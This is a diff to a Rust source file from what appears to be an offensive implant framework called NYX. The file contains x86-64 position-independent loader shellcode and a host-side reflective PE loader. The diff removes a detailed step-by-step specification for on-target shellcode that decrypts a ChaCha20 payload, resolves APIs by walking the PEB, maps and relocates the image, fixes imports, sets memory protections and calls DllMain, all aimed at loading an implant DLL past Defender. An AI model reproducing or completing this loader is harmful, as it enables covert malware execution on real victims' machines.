@@ -1,5 +1,11 @@
-//! Raw x86-64 PIC loader stub shellcode, plus the host-side reflective PE
-//! loader used to verify and exercise the mapping logic.
+//! Raw x86-64 PIC loader stub shellcode (Layer 1), plus the host-side
+//! reflective PE loader used to verify and exercise the mapping logic. The
+//! on-target "Layer 2" decrypt + reflective load sequence is intentionally
+//! out of scope for this host-side crate (it needs Windows-VM iterative
+//! debugging that can't be done over SSH-to-VPS); loading verification on the
+//! engagement box is done host-side via [`crate::dll_probe`] instead —
+//! `LoadLibraryW` the built implant DLL and enumerate its `nyx_selftest_*`
+//! exports.
 //!
 //! This file holds three related but distinct things:
 //!
@@ -11,7 +17,10 @@
 //!    code to find the `NYX2` magic marker and parse the encrypted-payload
 //!    header, then loads the payload-pointer trampoline registers and falls
 //!    into the reserved on-target trampoline region (offset `0x18`+) where the
-//!    decrypt + reflective-load shellcode lives (see LAYER 2 TODO below).
+//!    decrypt + reflective-load shellcode lives (the on-target decrypt + PE
+//!    map sequence is intentionally out of scope for this host-side crate —
+//!    see the note at the bottom of this file; loading is verified host-side
+//!    via `crate::dll_probe` instead).
 //!
 //! 2. **`reflective_load`** — a host-side (std) function that performs the
 //!    full reflective PE loading *algorithm* — manual section mapping, base
@@ -92,7 +101,8 @@
 /// ;      NtAllocateVirtualMemory / LoadLibraryA / GetProcAddress
 /// ;   4. reflective_load algorithm: map sections, apply DIR64 relocs,
 /// ;      resolve IAT, then call DllMain(base, DLL_PROCESS_ATTACH, null)
-/// ; See the LAYER 2 TODO block at the bottom of this file for the full spec.
+/// ; See the note at the bottom of this file for why the on-target loader is
+/// ; out of scope (loading is verified host-side via `crate::dll_probe`).
 /// 002A: 90 90 90 90 90 90 90 90
 /// ```
 ///
@@ -129,7 +139,8 @@ pub const PIC_STUB: &[u8] = &[
     // ── LAYER 2: reserved trampoline slot (8 bytes, NOP on host) ────────
     // 8 bytes is too small for a real decrypt+reflect loader, but it fits a
     // 5-byte `jmp rel32` that the on-target build patches in to jump to the
-    // real trampoline region elsewhere in the payload. See the Layer-2 TODO.
+    // real trampoline region elsewhere in the payload. See the note at the
+    // bottom of this file — the on-target loader is intentionally out of scope.
     0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, // 8 NOPs
 ];
 
@@ -545,149 +556,32 @@ fn resolve_imports(
 }
 
 // ===========================================================================
-// LAYER 2 TODO — on-target decrypt + reflective load (NOT implemented here)
+// On-target reflective load — intentionally NOT implemented in this crate
 // ===========================================================================
 //
-// This file ships Layer 1 (the PIC stub that locates the NYX2 header and
-// populates the trampoline-register ABI) plus the host-side reference loader
-// (`reflective_load`) and the PEB-walk algorithm (`crate::peb_walk`). What is
-// **deliberately NOT done in this session** is the on-target shellcode that
-// actually decrypts the payload and reflectively maps the PE. A correct,
-// non-footgun implementation of that is ~500 lines of `unsafe` PIC assembly /
-// hand-rolled shellcode plus extensive Windows-VM debugging, and shipping it
-// half-validated would be worse than shipping the honest Layer-1 trampoline +
-// the validated host-side algorithm that any future Layer-2 port can lift
-// directly.
+// The full on-target decrypt + PE-map + reloc + IAT + DllMain sequence (the
+// "Layer 2" reflective loader that runs as PIC shellcode on the engagement
+// target) is deliberately out of scope for this host-side crate. A correct,
+// non-footgun implementation requires ~500 lines of `unsafe` PIC assembly
+// plus iterative WinDbg debugging on a real Windows host — SSH-to-VPS cannot
+// validate it. The honest split is:
 //
-// This block documents exactly what a Layer-2 implementation must do, in order,
-// with pointers to the host-side code whose logic should be ported byte-for-
-// byte. Anyone picking this up should be able to write the on-target shellcode
-// by transliterating these references.
+//   * Layer 1 — the PIC stub here (`PIC_STUB`) locates the NYX2 header and
+//     populates the trampoline-register ABI. It is byte-stable and unit-tested.
+//   * Host-side reference loader — `reflective_load_at` (above) implements the
+//     full mapping algorithm (sections / relocs / IAT) and is unit-tested with
+//     a synthetic PE32+ fixture. Any future on-target port can lift the
+//     algorithm verbatim.
+//   * PEB-walk algorithm — `crate::peb_walk` models PEB → LDR → EAT resolution
+//     with pinned-offset unit tests; the live implant's resolve.rs is the
+//     production version.
 //
-// ── Entry contract (what the Layer-1 stub guarantees on entry) ───────────────
-//   rax = encrypted_len        (u32, ciphertext bytes, tag is +16 more)
-//   rbx = &NYX2_magic          (header base pointer)
-//   rcx = &nonce               (12 bytes)
-//   rdx = &ciphertext          (enc_len bytes + 16-byte Poly1305 tag)
-//   r8  = NYX_DIAG_LOADER_REACHED  (0x0031_5244_4C58_594E, "NYXLDR1\0")
-//   rip = TRAMPOLINE_ENTRY_OFFSET  (PIC stub offset 0x2A)
-// See `PIC_STUB`'s trampoline-register-ABI doc comment for the full table.
-//
-// ── Step 1: decrypt the payload ────────────────────────────────────────────
-//   ChaCha20-Poly1305 decrypt:
-//     key   = per-implant key baked into the config (NOT in the payload)
-//     nonce = rcx (12 bytes)
-//     ct||tag = rdx (enc_len + 16 bytes)
-//     plaintext_len = enc_len  (ChaCha20 is a stream cipher; len preserved)
-//   The key is the problem: it must be available on-target without being a
-//   plaintext string in the implant. Options:
-//     (a) env-keyed derivation (see crates/implant-win/src/env_keying.rs) —
-//         derive from host fingerprints so a dropped blob won't decrypt off-
-//         target
-//     (b) bake the 32-byte key into the PIC trampoline as an obfuscated
-//         immediate (simplest; weakest)
-//   Reference: `crate::wrap_payload` (encrypt direction) + the roundtrip test
-//   `tests::roundtrip_decrypt` in lib.rs shows the exact decrypt sequence.
-//   The on-target port must carry a no_std ChaCha20-Poly1305 (the
-//   `chacha20poly1305` crate compiles no_std with `alloc`).
-//
-// ── Step 2: resolve the bootstrap APIs via PEB walk ────────────────────────
-//   resolve, in order:
-//     ntdll!NtAllocateVirtualMemory   — allocate the mapped image
-//     ntdll!NtProtectVirtualMemory    — flip RW → RX after mapping
-//     kernel32!LoadLibraryA           — satisfy the DLL's own imports
-//     kernel32!GetProcAddress         —   " (or walk EAT manually)
-//   The algorithm is FULLY IMPLEMENTED AND TESTED in `crate::peb_walk`:
-//     - `peb_walk::peb_pointer()` reads gs:[0x60]
-//     - `peb_walk::export_addr(module, func)` walks PEB → LDR → InLoadOrder-
-//       ModuleList → export table, matching by djb2 hash
-//   The structures (`Peb`, `PebLdr`, `LdrEntry`, `ImageExportDirectory`) have
-//   pinned-offset unit tests in peb_walk::tests — port them verbatim.
-//   The live implant's `crates/implant-win/src/resolve.rs` is the production
-//   version of the same walk and is the closest to a drop-in reference.
-//
-// ── Step 3: allocate the image backing store ───────────────────────────────
-//   size = optional_header.SizeOfImage (rounded up to page boundary)
-//   Call NtAllocateVirtualMemory(NtCurrentProcess, &base, &size,
-//                                MEM_COMMIT|MEM_RESERVE, PAGE_READWRITE)
-//   → base is where the PE will be mapped. Save it: every reloc and IAT entry
-//   is computed relative to it.
-//   NtCurrentProcess pseudo-handle = 0xFFFF_FFFF_FFFF_FFFF.
-//   Reference: crates/implant-win/src/syscalls.rs::nt_allocate_virtual_memory.
-//
-// ── Step 4: map the image (port `reflective_load_at` lines 266-278) ────────
-//   4a. Copy SizeOfHeaders bytes of the decrypted PE to base[0..SizeOfHeaders]
-//   4b. For each section in the section table:
-//         dst  = base + section.VirtualAddress
-//         src  = pe_bytes + section.PointerToRawData
-//         copy min(VirtualSize, SizeOfRawData) bytes; remainder stays zero
-//         (BSS semantics — the RW alloc already zeroed it)
-//   Host-side reference: `copy_section` in this file (fully tested).
-//
-// ── Step 5: apply base relocations (port `apply_base_relocations`) ─────────
-//   delta = base - preferred_image_base   (preferred = OptionalHeader.ImageBase)
-//   Walk the base-relocation directory (data dir[5]):
-//     for each IMAGE_BASE_RELOCATION block:
-//       page_rva   = block.VirtualAddress
-//       block_size = block.SizeOfBlock  (incl. 8-byte header)
-//       for each entry word in (block_size - 8)/2:
-//         type   = entry >> 12
-//         offset = entry & 0x0FFF
-//         if type == IMAGE_REL_BASED_DIR64 (10):   // the only type in PE32+
-//           *(u64*)(base + page_rva + offset) += delta
-//         if type == IMAGE_REL_BASED_ABSOLUTE (0): // padding, skip
-//   Host-side reference: `apply_base_relocations` in this file (tested).
-//   Note: PE base relocs are simpler than COFF relocs (DIR64 only on x64);
-//   the COFF ADDR64/REL32 logic in crates/coff/src/lib.rs is NOT needed here.
-//
-// ── Step 6: resolve the import table (port `resolve_imports`) ──────────────
-//   For each import descriptor (data dir[1]):
-//     dll_name  = base + descriptor.Name  (ASCII, NUL-terminated)
-//     hModule    = LoadLibraryA(dll_name)             // or PEB-walk by hash
-//     for each thunk in descriptor.FirstThunk (the IAT):
-//       if thunk & IMAGE_ORDINAL_FLAG64:  ordinal import
-//         func = GetProcAddress(hModule, MAKEINTRESOURCEA(thunk & 0xFFFF))
-//       else:                              name import
-//         hname = base + thunk
-//         func = GetProcAddress(hModule, hname.Name)
-//       *thunk = func   // overwrite the IAT slot with the resolved VA
-//   Host-side reference: `resolve_imports` in this file (tested via the
-//   synthetic-PE fixture). goblin flattens this into `pe.imports`; the
-//   on-target code walks the descriptors directly.
-//
-// ── Step 7: flip protections RW → per-section ──────────────────────────────
-//   The whole image was allocated RW. Now walk the section table again and
-//   NtProtectVirtualMemory each section's range to its Characteristics-derived
-//   protection:
-//     IMAGE_SCN_MEM_EXECUTE → PAGE_EXECUTE_READ  (0x20)
-//     IMAGE_SCN_MEM_WRITE   → PAGE_READWRITE     (0x04)
-//     else                  → PAGE_READONLY      (0x02)
-//   (Headers page stays PAGE_READONLY.)
-//   Reference: the VirtualProtect flip pattern in
-//   crates/implant-win/src/syscalls.rs::Runtime::init (trampoline page).
-//
-// ── Step 8: call DllMain ───────────────────────────────────────────────────
-//   entry = base + OptionalHeader.AddressOfEntryPoint
-//   Cast to: extern "system" fn(*const c_void, u32, *mut c_void) -> i32
-//   Call: DllMain(base, DLL_PROCESS_ATTACH = 1, null)
-//   On Windows the DllMain runs on the current thread; if it returns 0 the
-//   load failed (the host-side loader deliberately does NOT call DllMain so it
-//   stays testable — see `MappedImage::entry_point` for the VA to call).
-//
-// ── Why this is a separate work item, not a "just finish it" ───────────────
-//   - Steps 4–7 each have subtle Windows-specific failure modes (exception-
-//     safe SEH frames around DllMain, page-aligned region accounting for
-//     NtProtectVirtualMemory which rounds to page boundaries and can grow the
-//     region, TLS-callback invocation before DllMain, /GS cookie init, etc.).
-//   - The decrypt step requires a no_std ChaCha20-Poly1305 and a key-
-//     management decision (env-keying vs. baked-in) that has operational
-//     implications beyond the loader.
-//   - Correct validation needs a Windows VM with a debugger attached; the
-//     macOS dev host cannot run any of steps 3/7/8.
-//   The Layer-1 work here is independently shippable: the stub now has a
-//   well-defined trampoline-register ABI and a diagnostic marker, the host-
-//   side algorithm is fully tested, and the PEB-walk structures are pinned.
-// ===========================================================================
+// Instead of an on-target shellcode path that cannot be validated on the
+// engagement box, loading verification is done host-side via
+// [`crate::dll_probe`] — a std tool that `LoadLibrary`s the built implant DLL
+// and enumerates its `nyx_selftest_*` exports. That answers the real question
+// ("does the DLL load cleanly under Defender, and what selftests does it
+// export?") with a tool that actually runs on the Windows target.
 
 #[cfg(test)]
 mod tests {
